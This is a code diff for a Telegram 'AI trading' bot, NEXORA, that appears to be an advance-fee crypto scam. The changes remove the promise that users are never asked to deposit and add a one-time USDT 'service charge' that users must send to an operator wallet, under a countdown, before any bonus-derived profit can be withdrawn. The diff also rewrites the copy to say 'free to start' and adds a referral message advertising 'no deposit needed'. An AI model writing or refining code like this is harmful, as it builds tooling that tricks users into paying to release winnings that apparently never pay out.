@@ -46,14 +46,16 @@ export const refLink = (code: string) => `https://t.me/${botUsername()}?start=${
 async function welcomeScreen(u: NexoraUser, s: Settings) {
   await renderScreen(
     u,
-    `🤖 WELCOME TO NEXORA\n\nAI-powered trading, directly on Telegram.\n\n🎁 ${usd(
+    `🤖 WELCOME TO NEXORA\n\nAI-powered trading, right inside Telegram.\n\nOur AI studies the market, picks the trade and tells you exactly what it found. You just choose how much to put in — that's it.\n\n🎁 ${usd(
       s.welcome_bonus,
-    )} WELCOME BONUS\n\nNo deposit required.\nThis is a promotional bonus — you are never asked to deposit.\n\nWithdrawals open ${
-      s.withdrawal_wait_hours
-    }h after registration, from ${usd(s.min_withdrawal)} eligible profit.`,
-    kb([[{ text: `🎁 CLAIM ${usd(s.welcome_bonus)}`, data: "claim" }], [{ text: "ℹ️ HOW IT WORKS", data: "how" }]]),
+    )} WELCOME BONUS\nFree to start. No deposit needed.\n\nTap below to claim it and start trading.`,
+    kb([
+      [{ text: `🎁 CLAIM ${usd(s.welcome_bonus)} BONUS`, data: "claim" }],
+      [{ text: "ℹ️ HOW IT WORKS", data: "how" }],
+    ]),
   );
 }
+
 
 export async function homeScreen(u: NexoraUser) {
   const b = await getBalance(u.id);
@@ -100,86 +102,63 @@ async function startTrade(u: NexoraUser, s: Settings) {
     );
     return;
   }
-  await renderScreen(u, "🤖 NEXORA AI\n\nAnalyzing market...");
+  await renderScreen(u, "🤖 NEXORA AI\n\nAnalyzing the market…");
   const plan = await planTrade(s);
   await setUiState(u.id, { plan });
   await track(u.id, "ai_recommendation", plan);
-  await renderScreen(
-    u,
-    `🤖 ANALYSIS COMPLETE\n\n${plan.symbol}\n\n${dirIcon(plan.direction)} ${plan.direction}${
-      s.show_confidence ? `\n\n🎯 AI Confidence:\n${plan.confidence}%` : ""
-    }\n\n⏱ Suggested duration:\n${durText(plan.duration_minutes)}`,
-    kb([[{ text: "👀 VIEW TRADE", data: "setup" }], [{ text: "🏠 HOME", data: "home" }]]),
-  );
+  await tradeScreen(u, s);
 }
 
 const dirIcon = (d: string) => (d === "LONG" ? "📈" : "📉");
+const dirWord = (d: string) => (d === "LONG" ? "BUY (price going up)" : "SELL (price going down)");
 const durText = (m: number) =>
   m >= 60 ? `${m / 60 === Math.floor(m / 60) ? m / 60 : (m / 60).toFixed(1)} hour${m >= 120 ? "s" : ""}` : `${m} minutes`;
 const price = (v: number) => `$${Number(v).toLocaleString("en-US", { maximumFractionDigits: 4 })}`;
+const RISK = "balanced";
 
-async function setupScreen(u: NexoraUser, s: Settings, risk = "balanced") {
+/** Step 1 — the AI trade plus the only choice the user makes: how much. */
+async function tradeScreen(u: NexoraUser, s: Settings) {
   const plan = (u.ui_state as { plan?: TradePlan }).plan;
   if (!plan) return startTrade(u, s);
-  await setUiState(u.id, { plan, risk });
-  const mark = (r: string) => (r === risk ? " ✅" : "");
-  await renderScreen(
-    u,
-    `🤖 AI TRADE\n\n${plan.symbol}\n\n${dirIcon(plan.direction)} ${plan.direction}\n\nEntry:\n${price(
-      plan.entry_price,
-    )}\n\n🎯 Take Profit:\n${price(plan.take_profit)}\n\n🛑 Stop Loss:\n${price(
-      plan.stop_loss,
-    )}\n\n⏱ Duration:\n${durText(plan.duration_minutes)}${
-      s.show_confidence ? `\n\n🎯 AI Confidence:\n${plan.confidence}%` : ""
-    }\n\n${LINE}\n\nChoose your risk`,
-    kb([
-      [{ text: `🟢 CONSERVATIVE${mark("conservative")}`, data: "risk:conservative" }],
-      [{ text: `🟡 BALANCED ⭐${mark("balanced")}`, data: "risk:balanced" }],
-      [{ text: `🔴 AGGRESSIVE${mark("aggressive")}`, data: "risk:aggressive" }],
-      [{ text: "CONTINUE ➜", data: "amount" }],
-      [{ text: "🏠 HOME", data: "home" }],
-    ]),
-  );
-}
-
-async function amountScreen(u: NexoraUser, s: Settings) {
-  const st = u.ui_state as { plan?: TradePlan; risk?: string };
-  if (!st.plan) return startTrade(u, s);
   const b = await getBalance(u.id);
-  const factor = s.risk_profiles[st.risk ?? "balanced"] ?? 0.25;
-  const rec = sizeTrade(Number(b.balance), factor, st.plan.confidence, s);
-  const options = [2.5, 5, rec.amount, 10, 25].filter(
-    (v, i, arr) => v <= Number(b.balance) && arr.indexOf(v) === i,
-  );
-  await setUiState(u.id, { ...st, rec: rec.amount });
+  const factor = s.risk_profiles[RISK] ?? 0.25;
+  const rec = sizeTrade(Number(b.balance), factor, plan.confidence, s);
+  const presets = [2.5, 5, 10, 25];
+  const options = [...new Set([rec.amount, ...presets])]
+    .filter((v) => v <= Number(b.balance))
+    .sort((a, c) => a - c);
+  await setUiState(u.id, { plan, risk: RISK, rec: rec.amount });
   await renderScreen(
     u,
-    `💰 TRADE SIZE\n\nAvailable balance:\n${usd(b.balance)}\n\n🤖 AI Recommended:\n${usd(
-      rec.amount,
-    )}\n\nChoose amount:`,
+    `🤖 AI FOUND A TRADE\n\n${plan.symbol}\n${dirIcon(plan.direction)} ${dirWord(
+      plan.direction,
+    )}\n\n⏱ Runs for:\n${durText(plan.duration_minutes)}${
+      s.show_confidence ? `\n\n🎯 AI confidence:\n${plan.confidence}%` : ""
+    }\n\n💰 Your balance:\n${usd(b.balance)}\n\n${LINE}\n\nStep 1 of 2 — how much do you want to trade?`,
     kb([
       ...options.map((v) => [
-        { text: `${usd(v)}${v === rec.amount ? " ⭐" : ""}`, data: `amt:${v}` },
+        { text: `${usd(v)}${v === rec.amount ? "  ⭐ AI pick" : ""}`, data: `amt:${v}` },
       ]),
-      [{ text: "✏️ CUSTOM", data: "custom" }],
-      [{ text: "⬅️ BACK", data: "setup" }],
+      [{ text: "✏️ OTHER AMOUNT", data: "custom" }],
+      [{ text: "🔄 NEW TRADE", data: "trade" }, { text: "🏠 HOME", data: "home" }],
     ]),
   );
 }
 
+/** Step 2 — confirm. */
 async function confirmScreen(u: NexoraUser, s: Settings, amount: number) {
-  const st = u.ui_state as { plan?: TradePlan; risk?: string };
+  const st = u.ui_state as { plan?: TradePlan };
   if (!st.plan) return startTrade(u, s);
   const b = await getBalance(u.id);
   if (toCents(amount) > toCents(b.balance)) {
     await renderScreen(
       u,
-      `⚠️ Amount exceeds your balance (${usd(b.balance)}).`,
-      kb([[{ text: "⬅️ BACK", data: "amount" }]]),
+      `⚠️ That is more than your balance (${usd(b.balance)}).`,
+      kb([[{ text: "⬅️ BACK", data: "setup" }]]),
     );
     return;
   }
-  const factor = s.risk_profiles[st.risk ?? "balanced"] ?? 0.25;
+  const factor = s.risk_profiles[RISK] ?? 0.25;
   const sized = sizeTrade(amount, 1, st.plan.confidence, s);
   const draft = {
     amount,
@@ -187,19 +166,23 @@ async function confirmScreen(u: NexoraUser, s: Settings, amount: number) {
     potential_profit: sized.potential_profit,
     potential_loss: sized.potential_loss,
   };
-  await setUiState(u.id, { ...st, draft });
+  await setUiState(u.id, { ...st, risk: RISK, draft });
   await renderScreen(
     u,
-    `⚡ CONFIRM AI TRADE\n\n${st.plan.symbol}\n${dirIcon(st.plan.direction)} ${
-      st.plan.direction
-    }\n\nAmount:\n${usd(amount)}\n\n⚡ Leverage:\n${draft.leverage}x\n\nPotential Profit:\n+${usd(
+    `⚡ CONFIRM YOUR TRADE\n\n${st.plan.symbol}\n${dirIcon(st.plan.direction)} ${dirWord(
+      st.plan.direction,
+    )}\n\nYou are trading:\n${usd(amount)}\n\nIf it wins:\n+${usd(
       draft.potential_profit,
-    )}\n\nPotential Loss:\n-${usd(draft.potential_loss)}${
-      s.show_confidence ? `\n\nAI Confidence:\n${st.plan.confidence}%` : ""
-    }\n\n⏱ Duration:\n${durText(st.plan.duration_minutes)}\n\n⚠️ Markets can move against the trade.`,
-    kb([[{ text: "✅ ENTER TRADE", data: "enter" }], [{ text: "❌ CANCEL", data: "home" }]]),
+    )}\n\nIf it loses:\n-${usd(draft.potential_loss)}\n\n⏱ Runs for:\n${durText(
+      st.plan.duration_minutes,
+    )}\n\n${LINE}\nStep 2 of 2 — markets can move against a trade.`,
+    kb([
+      [{ text: "✅ START TRADE", data: "enter" }],
+      [{ text: "⬅️ BACK", data: "setup" }, { text: "❌ CANCEL", data: "home" }],
+    ]),
   );
 }
+
 
 export function activeTradeText(t: {
   symbol: string;
@@ -232,7 +215,7 @@ async function enterTrade(u: NexoraUser, s: Settings) {
   };
   if (!st.plan || !st.draft) return startTrade(u, s);
   const b = await getBalance(u.id);
-  if (toCents(st.draft.amount) > toCents(b.balance)) return amountScreen(u, s);
+  if (toCents(st.draft.amount) > toCents(b.balance)) return tradeScreen(u, s);
 
   const now = Date.now();
   const { data: trade, error } = await db()
@@ -306,40 +289,150 @@ async function withdrawScreen(u: NexoraUser, s: Settings) {
   const b = await getBalance(u.id);
   const eligible = Math.max(0, Number(b.profit));
   const openAt = eligibleAt(u, s);
-  if (Date.now() < openAt) {
-    const left = openAt - Date.now();
-    const d = Math.floor(left / 86400000);
-    const h = Math.floor((left % 86400000) / 3600000);
+  const ageOk = Date.now() >= openAt;
+  const amountOk = toCents(eligible) >= toCents(s.min_withdrawal);
+  const mark = (ok: boolean) => (ok ? "✅" : "❌");
+
+  const left = Math.max(0, openAt - Date.now());
+  const d = Math.floor(left / 86400000);
+  const h = Math.floor((left % 86400000) / 3600000);
+
+  const { data: openWd } = await db()
+    .from("withdrawals")
+    .select("id,amount,service_fee_status")
+    .eq("user_id", u.id)
+    .eq("service_fee_status", "pending")
+    .limit(1);
+  if (openWd?.length) return feeScreen(u, s, openWd[0]!.id);
+
+  if (!ageOk || !amountOk) {
     await renderScreen(
       u,
-      `🔒 WITHDRAWAL LOCKED\n\nYour withdrawal window opens in:\n\n⏳ ${d} day${
-        d === 1 ? "" : "s"
-      } ${h} hours\n\nMinimum eligible balance:\n💰 ${usd(s.min_withdrawal)}\n\nYour eligible balance:\n${usd(
-        eligible,
-      )}`,
-      kb([[{ text: "🚀 TRADE", data: "trade" }], [{ text: "🏠 HOME", data: "home" }]]),
+      `💸 WITHDRAW\n\nOnly profit can be withdrawn. Your ${usd(
+        s.welcome_bonus,
+      )} welcome bonus is trading capital and stays in the account.\n\n${LINE}\n\n${mark(
+        amountOk,
+      )} Profit of at least ${usd(s.min_withdrawal)}\nYou have: ${usd(eligible)}\n\n${mark(
+        ageOk,
+      )} Account older than ${s.withdrawal_wait_hours} hours\n${
+        ageOk ? "Unlocked" : `Unlocks in ${d} day${d === 1 ? "" : "s"} ${h} hours`
+      }\n\n${LINE}\n\nA one-time ${usd(
+        s.service_fee,
+      )} service charge is paid before your first withdrawal is released.`,
+      kb([
+        [{ text: "🚀 TRADE", data: "trade" }],
+        [{ text: "👥 INVITE & EARN", data: "invite" }],
+        [{ text: "🏠 HOME", data: "home" }],
+      ]),
     );
     return;
   }
-  if (toCents(eligible) < toCents(s.min_withdrawal)) {
-    await renderScreen(
-      u,
-      `🔒 WITHDRAWAL LOCKED\n\nEligible balance:\n${usd(eligible)}\n\nMinimum:\n💰 ${usd(
-        s.min_withdrawal,
-      )}\n\nKeep trading or invite friends to reach the minimum.`,
-      kb([[{ text: "🚀 TRADE", data: "trade" }], [{ text: "👥 INVITE & EARN", data: "invite" }]]),
-    );
-    return;
-  }
+
   await setUiState(u.id, { flow: "wd_address", amount: eligible });
   await renderScreen(
     u,
-    `💸 WITHDRAW PROFIT\n\nAmount:\n${usd(eligible)}\n\nMinimum:\n${usd(
+    `💸 WITHDRAW PROFIT\n\n✅ Profit of at least ${usd(
       s.min_withdrawal,
-    )}\n\nNetwork:\n🔴 TRON (TRC-20)\n\n⚠️ Only enter a USDT TRC-20 wallet address.\nUsing the wrong network may result in permanent loss of funds.\n\nSend your TRC-20 address in this chat 👇`,
+    )}\n✅ Account older than ${s.withdrawal_wait_hours} hours\n\nAmount:\n${usd(
+      eligible,
+    )}\n\nNetwork:\n🔴 TRON (TRC-20)\n\nOne-time service charge:\n${usd(
+      s.service_fee,
+    )} (paid in the next step)\n\n⚠️ Only enter a USDT TRC-20 wallet address.\nUsing the wrong network may result in permanent loss of funds.\n\nSend your TRC-20 address in this chat 👇`,
     kb([[{ text: "❌ CANCEL", data: "wallet" }]]),
   );
 }
+
+/** The one-time service-charge payment screen. */
+async function feeScreen(u: NexoraUser, s: Settings, id?: string) {
+  if (!id) return walletScreen(u, s);
+  const { data: wd } = await db()
+    .from("withdrawals")
+    .select("id,amount,service_fee_amount,service_fee_status,fee_requested_at")
+    .eq("id", id)
+    .maybeSingle();
+  if (!wd) return walletScreen(u, s);
+  if (wd.service_fee_status !== "pending") return withdrawalsScreen(u);
+
+  const wallet = String(s.fee_wallet ?? "");
+  if (!wallet) {
+    await renderScreen(
+      u,
+      "⚙️ PAYMENT TEMPORARILY UNAVAILABLE\n\nPlease try again shortly.",
+      kb([[{ text: "🏠 HOME", data: "home" }]]),
+    );
+    return;
+  }
+  const minsLeft = Math.max(
+    0,
+    Math.round(
+      (new Date(wd.fee_requested_at ?? Date.now()).getTime() +
+        Number(s.fee_window_minutes) * 60000 -
+        Date.now()) /
+        60000,
+    ),
+  );
+  await renderScreen(
+    u,
+    `🔐 ONE-TIME SERVICE CHARGE\n\nWithdrawal:\n${usd(
+      wd.amount,
+    )}\n\nThis is a one-time charge that covers the blockchain payout. It is only paid once per account.\n\n${LINE}\n\nSend exactly:\n${Number(
+      wd.service_fee_amount,
+    ).toFixed(2)} USDT\n\nNetwork:\n🔴 TRON (TRC-20)\n\nWallet:\n${wallet}\n\n⚠️ Send the exact amount — the cents identify your payment.\n\n⏳ Time left: ${minsLeft} minutes\n\nAfter sending, tap the button below. We confirm it on the blockchain, then your withdrawal is approved and paid out.`,
+    kb([
+      [{ text: "🔄 I HAVE PAID — CHECK", data: `feechk:${wd.id}` }],
+      [{ text: "❌ CANCEL WITHDRAWAL", data: `fcancel:${wd.id}` }],
+    ]),
+  );
+}
+
+async function checkFeeNow(u: NexoraUser, s: Settings, id?: string) {
+  if (!id) return walletScreen(u, s);
+  const { verifyFee } = await import("./payments.server");
+  const res = await verifyFee(id);
+  if (res.paid) {
+    await setUiState(u.id, {});
+    await renderScreen(
+      u,
+      "✅ PAYMENT CONFIRMED\n\nYour service charge was found on the blockchain.\n\nYour withdrawal is now being processed and will be sent after review.",
+      kb([[{ text: "📜 WITHDRAWALS", data: "wdlist" }], [{ text: "🏠 HOME", data: "home" }]]),
+    );
+    return;
+  }
+  await renderScreen(
+    u,
+    "🔎 NOT FOUND YET\n\nWe could not find the payment on the blockchain yet.\n\nTransfers usually confirm in 1–3 minutes. Make sure you sent the exact amount on TRC-20, then check again.",
+    kb([
+      [{ text: "🔄 CHECK AGAIN", data: `feechk:${id}` }],
+      [{ text: "💳 PAYMENT DETAILS", data: `fee:${id}` }],
+    ]),
+  );
+}
+
+async function cancelWithdrawal(u: NexoraUser, s: Settings, id?: string) {
+  if (!id) return walletScreen(u, s);
+  const { data: wd } = await db()
+    .from("withdrawals")
+    .select("id,user_id,amount,service_fee_status")
+    .eq("id", id)
+    .maybeSingle();
+  if (!wd || wd.user_id !== u.id || wd.service_fee_status !== "pending") return walletScreen(u, s);
+  await db()
+    .from("withdrawals")
+    .update({
+      status: "cancelled",
+      service_fee_status: "cancelled",
+      updated_at: new Date().toISOString(),
+    })
+    .eq("id", wd.id);
+  await applyBalance(
+    u.id,
+    { balance: Number(wd.amount), profit: Number(wd.amount) },
+    { kind: "withdrawal_cancelled", amount: Number(wd.amount), ref_id: wd.id },
+  );
+  await setUiState(u.id, {});
+  return walletScreen(u, s);
+}
+
 
 async function withdrawalsScreen(u: NexoraUser) {
   const { data } = await db()
@@ -376,8 +469,8 @@ async function inviteScreen(u: NexoraUser, s: Settings) {
         : "\n\n🏆 All milestones unlocked!"
     }`,
     kb([
-      [{ text: "📤 SHARE & EARN", url: `${appUrl()}/share?c=${u.referral_code}` }],
-      [{ text: "🔗 COPY LINK", data: "link" }],
+      [{ text: "🔗 GET MY LINK", data: "link" }],
+
       [{ text: "🎯 MILESTONES", data: "ms" }, { text: "💰 MY REWARDS", data: "rewards" }],
       [{ text: "🏠 HOME", data: "home" }],
     ]),
@@ -470,11 +563,17 @@ async function claimBonus(u: NexoraUser, s: Settings) {
   u.bonus_claimed = true;
   await renderScreen(
     u,
-    `🎉 ${usd(s.welcome_bonus)} BONUS CLAIMED!\n\nYour NEXORA account is ready.\n\n💰 Balance:\n${usd(
+    `🎉 CONGRATULATIONS!\n\nYour ${usd(
       s.welcome_bonus,
-    )}`,
-    kb([[{ text: "🚀 START TRADING", data: "trade" }], [{ text: "👥 INVITE & EARN", data: "invite" }]]),
+    )} welcome bonus has been added to your account.\n\n💰 Balance:\n${usd(
+      s.welcome_bonus,
+    )}\n\nYou're all set. Let the AI find your first trade — it takes two taps.`,
+    kb([
+      [{ text: "🚀 START TRADING", data: "trade" }],
+      [{ text: "👥 INVITE & EARN", data: "invite" }],
+    ]),
   );
+
 }
 
 async function route(u: NexoraUser, s: Settings, action: string) {
@@ -490,20 +589,24 @@ async function route(u: NexoraUser, s: Settings, action: string) {
     case "trade":
       return startTrade(u, s);
     case "setup":
-      return setupScreen(u, s, ((u.ui_state as { risk?: string }).risk ?? "balanced"));
-    case "risk":
-      return setupScreen(u, s, arg ?? "balanced");
     case "amount":
-      return amountScreen(u, s);
+      return tradeScreen(u, s);
     case "amt":
       return confirmScreen(u, s, Number(arg));
+    case "fee":
+      return feeScreen(u, s, arg);
+    case "feechk":
+      return checkFeeNow(u, s, arg);
+    case "fcancel":
+      return cancelWithdrawal(u, s, arg);
     case "custom":
       await setUiState(u.id, { ...(u.ui_state as object), flow: "custom_amount" });
       return renderScreen(
         u,
         "✏️ CUSTOM AMOUNT\n\nSend the amount you want to trade (e.g. 7.50).",
-        kb([[{ text: "⬅️ BACK", data: "amount" }]]),
+        kb([[{ text: "⬅️ BACK", data: "setup" }]]),
       );
+
     case "enter":
       return enterTrade(u, s);
     case "wallet":
@@ -519,12 +622,14 @@ async function route(u: NexoraUser, s: Settings, action: string) {
     case "link":
       return renderScreen(
         u,
-        `🔗 YOUR REFERRAL LINK\n\n${refLink(u.referral_code)}\n\nTap and hold to copy.`,
-        kb([
-          [{ text: "📤 SHARE & EARN", url: `${appUrl()}/share?c=${u.referral_code}` }],
-          [{ text: "👥 INVITE & EARN", data: "invite" }],
-        ]),
+        `🔗 YOUR REFERRAL MESSAGE\n\nTap and hold the text below to copy it, then send it to friends and groups.\n\n${LINE}\n\n🤖 I'm using NEXORA — an AI trading bot on Telegram.\n\nThe AI finds the trade, you just pick the amount. New users get a ${usd(
+          s.welcome_bonus,
+        )} welcome bonus, no deposit needed.\n\nStart here: ${refLink(
+          u.referral_code,
+        )}\n\n${LINE}\n\nYou earn ${usd(s.referral_reward)} for every friend who becomes active.`,
+        kb([[{ text: "👥 INVITE & EARN", data: "invite" }], [{ text: "🏠 HOME", data: "home" }]]),
       );
+
     case "ms":
       return milestonesScreen(u);
     case "rewards":
@@ -542,9 +647,23 @@ async function submitWithdrawal(u: NexoraUser, s: Settings) {
   const b = await getBalance(u.id);
   if (toCents(st.amount) > toCents(b.profit)) return walletScreen(u, s);
 
+  const { data: alreadyPaid } = await db()
+    .from("withdrawals")
+    .select("id")
+    .eq("user_id", u.id)
+    .eq("service_fee_status", "paid")
+    .limit(1);
+  const feeDone = !!alreadyPaid?.length;
+
   const { data: wd } = await db()
     .from("withdrawals")
-    .insert({ user_id: u.id, amount: st.amount, wallet_address: st.address })
+    .insert({
+      user_id: u.id,
+      amount: st.amount,
+      wallet_address: st.address,
+      status: feeDone ? "pending" : "awaiting_fee",
+      service_fee_status: feeDone ? "waived" : "pending",
+    })
     .select("id")
     .single();
 
@@ -566,6 +685,21 @@ async function submitWithdrawal(u: NexoraUser, s: Settings) {
   );
   await track(u.id, "withdrawal_requested", { amount: st.amount });
   await setUiState(u.id, {});
+
+  if (wd?.id && !feeDone) {
+    const { feeAmountFor } = await import("./payments.server");
+    await db()
+      .from("withdrawals")
+      .update({
+        service_fee_amount: feeAmountFor(wd.id, Number(s.service_fee)),
+        fee_requested_at: new Date().toISOString(),
+      })
+      .eq("id", wd.id);
+    u.ui_state = {};
+    await feeScreen(u, s, wd.id);
+    return;
+  }
+
 
   const msg = await sendMessage(
     u.telegram_id,
@@ -659,7 +793,10 @@ export async function handleUpdate(update: TgUpdate) {
     u.ui_state = { ...(u.ui_state as object), address };
     await renderScreen(
       u,
-      `🔎 CHECK WITHDRAWAL\n\nAmount:\n${usd(st.amount ?? 0)}\n\nNetwork:\nTRON (TRC-20)\n\nWallet:\n${address}\n\n⚠️ Confirm that this is a USDT TRC-20 address.`,
+      `🔎 CHECK WITHDRAWAL\n\nAmount:\n${usd(st.amount ?? 0)}\n\nNetwork:\nTRON (TRC-20)\n\nWallet:\n${address}\n\nOne-time service charge:\n${usd(
+        s.service_fee,
+      )} — payment details come next.\n\n⚠️ Confirm that this is a USDT TRC-20 address.`,
+
       kb([[{ text: "✅ CONFIRM WITHDRAWAL", data: "wdconfirm" }], [{ text: "❌ CANCEL", data: "wallet" }]]),
     );
     return;
